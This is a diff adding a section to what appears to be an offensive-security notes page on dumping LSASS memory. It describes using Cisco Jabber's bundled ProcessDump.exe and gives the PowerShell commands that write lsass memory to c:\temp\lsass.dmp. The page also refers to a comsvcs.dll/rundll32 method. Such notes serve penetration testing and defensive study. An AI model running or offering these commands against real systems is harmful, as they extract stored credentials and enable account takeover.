@@ -46,6 +46,17 @@ Executing a native comsvcs.dll DLL found in Windows\system32 with rundll32:
 
 ![](../../.gitbook/assets/image%20%28405%29.png)
 
+## ProcessDump.exe from Cisco Jabber
+
+Sometimes Cisco Jabber \(always?\) comes with a nice utility called `ProcessDump.exe` that can be found in `c:\program files (x86)\cisco systems\cisco jabber\x64\`. We can use it to dump lsass process memory in Powershell like so:
+
+```text
+cd c:\program files (x86)\cisco systems\cisco jabber\x64\
+processdump.exe (ps lsass).id c:\temp\lsass.dmp
+```
+
+![screenshot by @em1rerdogan](../../.gitbook/assets/image%20%28544%29.png)
+
 ## References
 
 {% embed url="https://t.co/s2VePo3ICo?amp=1" %}
